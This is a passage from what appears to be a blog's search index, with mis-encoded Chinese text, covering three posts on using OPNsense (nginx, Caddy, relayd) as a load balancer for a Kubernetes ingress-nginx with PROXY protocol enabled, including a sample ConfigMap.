Protocolä¸è¦é€‰ä¸­ï¼Œç„¶åRouteå°±é€‰Upstreamï¼ŒUpstream Serversé€‰ä¸­å¯¹åº”çš„ï¼Œå…¶å®ƒç¼ºçœå³å¯ã€‚\né‚£å¯¹åº”çš„ï¼Œåç«¯Kubernetesçš„Nginx ingressä¹Ÿè¦åšç›¸åº”é…ç½®\nNginx ingressçš„configmapï¼Œéœ€è¦åŠ ä¸ŠProxy Protocolçš„éƒ¨åˆ†\næˆ‘ä»¬ç”¨çš„æ˜¯å®˜ç½‘çš„ ingress-nginxï¼Œé…ç½®æ–‡ä»¶æ˜¯ ingress-nginx çš„namespaceä¸­\nconfigmap ingress-nginx-controllerï¼Œå†…å®¹å¦‚ä¸‹ï¼Œå¯¹åº”dataé‚£ä¸¤è¡Œï¼š\napiVersion: v1 data: use-proxy-protocol: \u0026#34;true\u0026#34; kind: ConfigMap metadata: annotations: meta.helm.sh/release-name: ingress-nginx meta.helm.sh/release-namespace: ingress-nginx nginx.ingress.kubernetes.io/configuration-snippet: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/location-snippet: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/server-snippet: \u0026#34;true\u0026#34; creationTimestamp: \u0026#34;2025-08-27T07:38:49Z\u0026#34; labels: app.kubernetes.io/component: controller app.kubernetes.io/instance: ingress-nginx app.kubernetes.io/managed-by: Helm app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginx app.kubernetes.io/version: 1.13.1 helm.sh/chart: ingress-nginx-4.13.1 name: ingress-nginx-controller namespace: ingress-nginx resourceVersion: \u0026#34;22298827\u0026#34; uid: d6eeef3c-7e44-4667-854a-c7693006b221 ç¼–è¾‘åï¼Œnginx ingressä¼šè‡ªåŠ¨reload\næœ€åå»OPNsense os-nginxçš„é…ç½®ï¼šGeneral Settingså»Enable nginxé€‰ä¸­ï¼Œç„¶åApplyå³å¯\nè¿™æ ·å°±å¾ˆå®Œç¾äº†ï¼Œåç«¯çš„Nginx ingressä¹Ÿå¯ä»¥è·å¾—çœŸå®å®¢æˆ·ç«¯IPäº†ï¼Œçœ‹çœ‹nginxçš„logç¡®è®¤ä¸€ä¸‹ã€‚\næ³¨æ„ï¼šrelaydå’Œcaddyå’ŒNginxä¸èƒ½åŒæ—¶å¯åŠ¨ã€‚\n","permalink":"https://rendoumi.com/posts/20251014-opensense_nginx/","summary":"\u003cp\u003eæ–°æ‰˜ç®¡äº†ä¸€ä¸ªæœºæˆ¿æœåŠ¡å™¨ï¼ŒåŸºæœ¬å…¨ç”¨å¼€æºè½¯ä»¶æ¥æ„å»ºï¼š\u003c/p\u003e\n\u003cp\u003eé‚£Firewallå°±ç”¨çš„OPNsenseï¼Œåç«¯è‡ªå»ºKubernetesï¼Œé‚£OPNsenseéœ€è¦å½“ä½œä¸€ä¸ªLoadBalanceæ¥ä½¿ç”¨\u003c/p\u003e\n\u003cp\u003eç»“æ„å›¾å¦‚ä¸‹ï¼Œè¯ä¹¦æ˜¯æ”¾åœ¨äº†Nginx ingresä¸Šï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091045980\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014091045980.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé‚£æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå„æœ‰åˆ©å¼Šï¼Œè¯´ä¸‹ç¬¬ä¸‰ä¸ªï¼Œ\u003ccode\u003eNginx\u003c/code\u003eçš„åšæ³•\u003c/p\u003e\n\u003cp\u003erelaydå’Œcaddyéƒ½è¯´å®Œäº†ï¼Œé‚£è¿˜æœ‰Nginxï¼ŒNginxçš„è¯ï¼Œå¦‚æœè¯ä¹¦æŒ‚åœ¨OPNsenseï¼Œé‚£å°±å¯ä»¥ç”¨WAFçš„åŠŸèƒ½\u003c/p\u003e\n\u003cp\u003eå¦‚æœè¯ä¹¦æ”¾åœ¨åç«¯Kubernetesçš„Nginx ingressä¸Šï¼Œé‚£å°±æ— æ³•ç”¨WAFäº†ï¼Œç®—æ˜¯data stream\u003c/p\u003e\n\u003cp\u003eé‚£æå‰è¯´ä¸€å¥ï¼ŒNginxçš„é…ç½®æ˜¯æœ‰Bugçš„ï¼Œå¦‚æœæ— æ³•æ¸…é™¤å¹²å‡€ï¼Œéœ€è¦sshç™»å½•opnsenseï¼Œç„¶å\u003c/p\u003e\n\u003cp\u003eæŠŠ /conf/ä¸‹xmlé…ç½®æ–‡ä»¶ä¸­çš„ nginx éƒ¨åˆ†åˆ é™¤æ‰ï¼Œç„¶åé‡å¯æœåŠ¡å™¨ï¼Œæ‰å¯ä»¥\u003c/p\u003e\n\u003cp\u003eos-nginxçš„é…ç½®æ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸€æ­¥ï¼šé¦–å…ˆå»Upstreamçš„Upstream Serverå­æ ‡ç­¾ï¼Œå»ºç«‹ä¸¤ç»„æœåŠ¡å™¨\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014103525587\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014103525587.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç¬¬äºŒæ­¥ï¼šå†å»Upstreamçš„Upstreamå­æ ‡ç­¾ï¼Œå»ºç«‹ä¸¤ç»„æœåŠ¡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014103800452\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014103800452.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå»ºç«‹çš„æ—¶å€™advanced modeè¦æ‰“å¼€ï¼ŒPROXY Protocolè¦é€‰ä¸­ï¼ŒServeré€‰ä¸­å„è‡ªçš„4ä¸ªæœåŠ¡å™¨ï¼Œå…¶å®ƒä¿æŒç¼ºçœå³å¯ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014103913320\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014103913320.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸‰æ­¥ï¼šå»Data Streamsçš„å­æ ‡ç­¾Stream Serversï¼Œå»ºä¸¤ç»„æœåŠ¡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014104039907\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014104039907.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç¼–è¾‘ä¸€ä¸‹ï¼Œç›‘å¬ç«¯å£åªé€‰æŒ‡å®šIPçš„80å’Œ443ï¼ŒPROXY Protocolä¸è¦é€‰ä¸­ï¼Œç„¶åRouteå°±é€‰Upstreamï¼ŒUpstream Serversé€‰ä¸­å¯¹åº”çš„ï¼Œå…¶å®ƒç¼ºçœå³å¯ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014104150653\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014104150653.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé‚£å¯¹åº”çš„ï¼Œåç«¯Kubernetesçš„Nginx ingressä¹Ÿè¦åšç›¸åº”é…ç½®\u003c/p\u003e\n\u003cp\u003eNginx ingressçš„configmapï¼Œéœ€è¦åŠ ä¸ŠProxy Protocolçš„éƒ¨åˆ†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014095327561\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014095327561.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ç”¨çš„æ˜¯å®˜ç½‘çš„ ingress-nginxï¼Œé…ç½®æ–‡ä»¶æ˜¯ ingress-nginx çš„namespaceä¸­\u003c/p\u003e\n\u003cp\u003econfigmap ingress-nginx-controllerï¼Œå†…å®¹å¦‚ä¸‹ï¼Œå¯¹åº”dataé‚£ä¸¤è¡Œï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  use-proxy-protocol: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: ConfigMap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  annotations:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    meta.helm.sh/release-name: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    meta.helm.sh/release-namespace: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    nginx.ingress.kubernetes.io/configuration-snippet: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    nginx.ingress.kubernetes.io/location-snippet: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    nginx.ingress.kubernetes.io/server-snippet: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  creationTimestamp: \u003cspan class=\"s2\"\u003e\u0026#34;2025-08-27T07:38:49Z\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  labels:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/component: controller\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/instance: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/managed-by: Helm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/name: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/part-of: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/version: 1.13.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    helm.sh/chart: ingress-nginx-4.13.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: ingress-nginx-controller\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  namespace: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resourceVersion: \u003cspan class=\"s2\"\u003e\u0026#34;22298827\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  uid: d6eeef3c-7e44-4667-854a-c7693006b221\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¾‘åï¼Œnginx ingressä¼šè‡ªåŠ¨reload\u003c/p\u003e","title":"OPNsenseå¦‚ä½•åšLoadBalanceæ¥å…¥åç«¯çš„Kubernetes nginx ingress --- Nginxç¯‡"},{"content":"æ–°æ‰˜ç®¡äº†ä¸€ä¸ªæœºæˆ¿æœåŠ¡å™¨ï¼ŒåŸºæœ¬å…¨ç”¨å¼€æºè½¯ä»¶æ¥æ„å»ºï¼š\né‚£Firewallå°±ç”¨çš„OPNsenseï¼Œåç«¯è‡ªå»ºKubernetesï¼Œé‚£OPNsenseéœ€è¦å½“ä½œä¸€ä¸ªLoadBalanceæ¥ä½¿ç”¨\nç»“æ„å›¾å¦‚ä¸‹ï¼Œè¯ä¹¦æ˜¯æ”¾åœ¨äº†Nginx ingresä¸Šï¼š\né‚£æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå„æœ‰åˆ©å¼Šï¼Œè¯´ä¸‹ç¬¬äºŒä¸ªï¼ŒCaddyçš„åšæ³•\nCaddyçœŸçš„æ˜¯ç‹é“ï¼Œä»€ä¹ˆæ³›åŸŸåï¼Œä¸€ä¸ªç«¯å£è·‘3ä¸ªåè®®ï¼Œéƒ½å¯ä»¥\nç”¨åˆ°Caddyï¼Œå°±è¦è§£å†³åç«¯Nginx ingressæ— æ³•è·å¾—å®¢æˆ·çœŸå®IPçš„é—®é¢˜\nCaddyé…ç½®å¦‚ä¸‹ï¼š\nGeneral Settingsï¼š\nEnable Layer4 Proxy è¦å‹¾é€‰ä¸Š\nAuto HTTPS è¦é€‰ä¸­Off\nå…¶å®ƒä¿æŒé»˜è®¤ï¼Œç„¶åå»åˆ°Layer4 Proxyè¿›è¡Œé…ç½®ï¼ŒåŒæ ·è¦é…2ä¸ªï¼Œä¸€ä¸ªHTTPï¼Œä¸€ä¸ªTLS\nç¼–è¾‘HTTPçš„ä»£ç†ï¼Œæ³¨æ„ Domain çš„åœ°æ–¹éœ€è¦æŠŠç”¨åˆ°çš„æ‰€æœ‰åŸŸååˆ—è¿›å»\nç¼–è¯‘TLSçš„ä»£ç†\næ³¨æ„ä¸Šé¢ï¼ŒProxy Protocoléƒ½è¦é€‰ä¸­v2ï¼Œè¿™æ ·å®¢æˆ·ç«¯çœŸå®IPæ‰å¯ä»¥é€ä¼ ç»™åç«¯çš„Nginx ingress\né‚£åŒæ ·åç«¯çš„Nginx ingressçš„configmapï¼Œä¹Ÿéœ€è¦åŠ ä¸ŠProxy Protocolçš„éƒ¨åˆ†\næˆ‘ä»¬ç”¨çš„æ˜¯å®˜ç½‘çš„ ingress-nginxï¼Œé…ç½®æ–‡ä»¶æ˜¯ ingress-nginx çš„namespaceä¸­\nconfigmap ingress-nginx-controllerï¼Œå†…å®¹å¦‚ä¸‹\napiVersion: v1 data: use-proxy-protocol: \u0026#34;true\u0026#34; kind: ConfigMap metadata: annotations: meta.helm.sh/release-name: ingress-nginx meta.helm.sh/release-namespace: ingress-nginx nginx.ingress.kubernetes.io/configuration-snippet: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/location-snippet: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/server-snippet: \u0026#34;true\u0026#34; creationTimestamp: \u0026#34;2025-08-27T07:38:49Z\u0026#34; labels: app.kubernetes.io/component: controller app.kubernetes.io/instance: ingress-nginx app.kubernetes.io/managed-by: Helm app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginx app.kubernetes.io/version: 1.13.1 helm.sh/chart: ingress-nginx-4.13.1 name: ingress-nginx-controller namespace: ingress-nginx resourceVersion: \u0026#34;22298827\u0026#34; uid: d6eeef3c-7e44-4667-854a-c7693006b221 ç¼–è¾‘åï¼Œnginx ingressä¼šè‡ªåŠ¨reload\nç„¶åå»OPNsense Caddyçš„General Settingsï¼Œé…ç½®ç”Ÿæ•ˆ\nè¿™æ ·å°±å¾ˆå®Œç¾äº†ï¼Œåç«¯çš„Nginx ingressä¹Ÿå¯ä»¥è·å¾—çœŸå®å®¢æˆ·ç«¯IPäº†ï¼Œçœ‹çœ‹nginxçš„logç¡®è®¤ä¸€ä¸‹ã€‚\næ³¨æ„ï¼šrelaydå’Œcaddyä¸èƒ½åŒæ—¶å¯åŠ¨ã€‚\n","permalink":"https://rendoumi.com/posts/20251014-opnsense_caddy/","summary":"\u003cp\u003eæ–°æ‰˜ç®¡äº†ä¸€ä¸ªæœºæˆ¿æœåŠ¡å™¨ï¼ŒåŸºæœ¬å…¨ç”¨å¼€æºè½¯ä»¶æ¥æ„å»ºï¼š\u003c/p\u003e\n\u003cp\u003eé‚£Firewallå°±ç”¨çš„OPNsenseï¼Œåç«¯è‡ªå»ºKubernetesï¼Œé‚£OPNsenseéœ€è¦å½“ä½œä¸€ä¸ªLoadBalanceæ¥ä½¿ç”¨\u003c/p\u003e\n\u003cp\u003eç»“æ„å›¾å¦‚ä¸‹ï¼Œè¯ä¹¦æ˜¯æ”¾åœ¨äº†Nginx ingresä¸Šï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091045980\" loading=\"lazy\" src=\"/posts/20251014-opnsense_caddy/image-20251014091045980.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé‚£æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå„æœ‰åˆ©å¼Šï¼Œè¯´ä¸‹ç¬¬äºŒä¸ªï¼Œ\u003ccode\u003eCaddy\u003c/code\u003eçš„åšæ³•\u003c/p\u003e\n\u003cp\u003eCaddyçœŸçš„æ˜¯ç‹é“ï¼Œä»€ä¹ˆæ³›åŸŸåï¼Œä¸€ä¸ªç«¯å£è·‘3ä¸ªåè®®ï¼Œéƒ½å¯ä»¥\u003c/p\u003e\n\u003cp\u003eç”¨åˆ°Caddyï¼Œå°±è¦è§£å†³åç«¯Nginx ingressæ— æ³•è·å¾—å®¢æˆ·çœŸå®IPçš„é—®é¢˜\u003c/p\u003e\n\u003cp\u003eCaddyé…ç½®å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eGeneral Settingsï¼š\u003c/p\u003e\n\u003cp\u003eEnable Layer4 Proxy è¦å‹¾é€‰ä¸Š\u003c/p\u003e\n\u003cp\u003eAuto HTTPS è¦é€‰ä¸­Off\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014094437866\" loading=\"lazy\" src=\"/posts/20251014-opnsense_caddy/image-20251014094437866.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…¶å®ƒä¿æŒé»˜è®¤ï¼Œç„¶åå»åˆ°Layer4 Proxyè¿›è¡Œé…ç½®ï¼ŒåŒæ ·è¦é…2ä¸ªï¼Œä¸€ä¸ªHTTPï¼Œä¸€ä¸ªTLS\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014094651852\" loading=\"lazy\" src=\"/posts/20251014-opnsense_caddy/image-20251014094651852.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç¼–è¾‘HTTPçš„ä»£ç†ï¼Œæ³¨æ„ Domain çš„åœ°æ–¹éœ€è¦æŠŠç”¨åˆ°çš„æ‰€æœ‰åŸŸååˆ—è¿›å»\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014094830397\" loading=\"lazy\" src=\"/posts/20251014-opnsense_caddy/image-20251014094830397.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç¼–è¯‘TLSçš„ä»£ç†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014095137803\" loading=\"lazy\" src=\"/posts/20251014-opnsense_caddy/image-20251014095137803.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ä¸Šé¢ï¼ŒProxy Protocoléƒ½è¦é€‰ä¸­v2ï¼Œè¿™æ ·å®¢æˆ·ç«¯çœŸå®IPæ‰å¯ä»¥é€ä¼ ç»™åç«¯çš„Nginx ingress\u003c/p\u003e\n\u003cp\u003eé‚£åŒæ ·åç«¯çš„Nginx ingressçš„configmapï¼Œä¹Ÿéœ€è¦åŠ ä¸ŠProxy Protocolçš„éƒ¨åˆ†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014095327561\" loading=\"lazy\" src=\"/posts/20251014-opnsense_caddy/image-20251014095327561.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ç”¨çš„æ˜¯å®˜ç½‘çš„ ingress-nginxï¼Œé…ç½®æ–‡ä»¶æ˜¯ ingress-nginx çš„namespaceä¸­\u003c/p\u003e\n\u003cp\u003econfigmap ingress-nginx-controllerï¼Œå†…å®¹å¦‚ä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  use-proxy-protocol: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: ConfigMap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  annotations:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    meta.helm.sh/release-name: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    meta.helm.sh/release-namespace: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    nginx.ingress.kubernetes.io/configuration-snippet: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    nginx.ingress.kubernetes.io/location-snippet: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    nginx.ingress.kubernetes.io/server-snippet: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  creationTimestamp: \u003cspan class=\"s2\"\u003e\u0026#34;2025-08-27T07:38:49Z\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  labels:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/component: controller\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/instance: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/managed-by: Helm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/name: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/part-of: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/version: 1.13.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    helm.sh/chart: ingress-nginx-4.13.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: ingress-nginx-controller\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  namespace: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resourceVersion: \u003cspan class=\"s2\"\u003e\u0026#34;22298827\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  uid: d6eeef3c-7e44-4667-854a-c7693006b221\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¾‘åï¼Œnginx ingressä¼šè‡ªåŠ¨reload\u003c/p\u003e","title":"OPNsenseå¦‚ä½•åšLoadBalanceæ¥å…¥åç«¯çš„Kubernetes nginx ingress --- caddyç¯‡"},{"content":"æ–°æ‰˜ç®¡äº†ä¸€ä¸ªæœºæˆ¿æœåŠ¡å™¨ï¼ŒåŸºæœ¬å…¨ç”¨å¼€æºè½¯ä»¶æ¥æ„å»ºï¼š\né‚£Firewallå°±ç”¨çš„OPNsenseï¼Œåç«¯è‡ªå»ºKubernetesï¼Œé‚£OPNsenseéœ€è¦å½“ä½œä¸€ä¸ªLoadBalanceæ¥ä½¿ç”¨\nç»“æ„å›¾å¦‚ä¸‹ï¼Œè¯ä¹¦æ˜¯æ”¾åœ¨äº†Nginx ingresä¸Šï¼š\né‚£æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå„æœ‰åˆ©å¼Šï¼Œå…ˆè¯´ç¬¬ä¸€ä¸ªï¼Œrelaydçš„åšæ³•\nrelaydæ˜¯æœ€æ—©çš„OPNsenseçš„æ’ä»¶ï¼Œç”¨æ¥åšè´Ÿè½½å‡è¡¡ï¼Œå®‰è£…è¿™ä¸ªpluginæ’ä»¶\né…ç½®å¦‚ä¸‹ï¼š\nGeneral Settingsï¼š\nç”±äºè™šæœºçš„cpuæ˜¯4ä¸ªï¼Œæ‰€ä»¥è¿›ç¨‹è®¾ç½®æˆ4\nBackend Hosts:\nåç«¯èŠ‚ç‚¹æœ‰4ä¸ªï¼Œåªå†™IPå³å¯\nTable Checksï¼š\nç«¯å£æ£€æŸ¥ï¼Œå› ä¸ºæ˜¯ç›´é€šï¼Œæ‰€ä»¥å°±è®¾ç½®æˆTCPæ£€æŸ¥å³å¯\nTablesï¼š\nHostsé€‰ä¸­4ä¸ªèŠ‚ç‚¹\nVirtual Serverï¼š\n80å’Œ443å„æœ‰ä¸€ä¸ª\næ¯ä¸ªå‘¢ï¼Œè®¾ç½®å¥½å‰é¢çš„ç›‘å¬åœ°å€å’Œç«¯å£ï¼Œåç«¯çš„Table æœåŠ¡å™¨å’ŒTable checkçš„åè®®ï¼Œå°±okäº†\næœ€åå» General Settings é€‰ä¸­ Enable Relaydï¼Œç„¶åsaveï¼Œå°±å¯ä»¥äº†\nè¿™ä¹ˆå¤šè´´å›¾ï¼Œæ˜¯å› ä¸ºå¦‚æœä»CLIé…ç½®ï¼Œå…¶å®å°±ä¸€ä¸ªå¾ˆç®€å•çš„relayd.confæ–‡æœ¬æ–‡ä»¶\nä½†æ˜¯ä»GUIï¼Œå°±ä¸€å¤§å †ï¼Œè€Œä¸”ç”Ÿæˆçš„ä¸œè¥¿ç®€ç›´ä¸çŸ¥æ‰€äº‘\nè¿™æ ·åšrelaydå°±ç›¸å½“äºä¸€ä¸ªç›´é€šçš„LoadBalanceï¼ŒæŠŠæµé‡é€å…¥åç«¯çš„Nginx ingressæ‰€å¼€çš„NodePortã€‚\nè¿™æ ·å°±å¯ç”¨äº†ã€‚\nè¿™æ ·æœ‰ä¸ªå¼Šç«¯ï¼ŒNginxçš„ingressæ‹¿ä¸åˆ°å®¢æˆ·ç«¯çš„çœŸå®IPï¼ŒX-forwarded-foræ— æ³•ä¼ è¿‡æ¥çœŸçš„å®¢æˆ·ç«¯IPï¼Œç½‘ä¸ŠæŸ¥æ–‡æ¡£æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ä»GUIé…äº†åŠå¤©ï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆé…ï¼Œæœäº†ä¹Ÿæ˜¯ã€‚\n","permalink":"https://rendoumi.com/posts/20251014-opnsense_relayd/","summary":"\u003cp\u003eæ–°æ‰˜ç®¡äº†ä¸€ä¸ªæœºæˆ¿æœåŠ¡å™¨ï¼ŒåŸºæœ¬å…¨ç”¨å¼€æºè½¯ä»¶æ¥æ„å»ºï¼š\u003c/p\u003e\n\u003cp\u003eé‚£Firewallå°±ç”¨çš„OPNsenseï¼Œåç«¯è‡ªå»ºKubernetesï¼Œé‚£OPNsenseéœ€è¦å½“ä½œä¸€ä¸ªLoadBalanceæ¥ä½¿ç”¨\u003c/p\u003e\n\u003cp\u003eç»“æ„å›¾å¦‚ä¸‹ï¼Œè¯ä¹¦æ˜¯æ”¾åœ¨äº†Nginx ingresä¸Šï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091045980\" loading=\"lazy\" 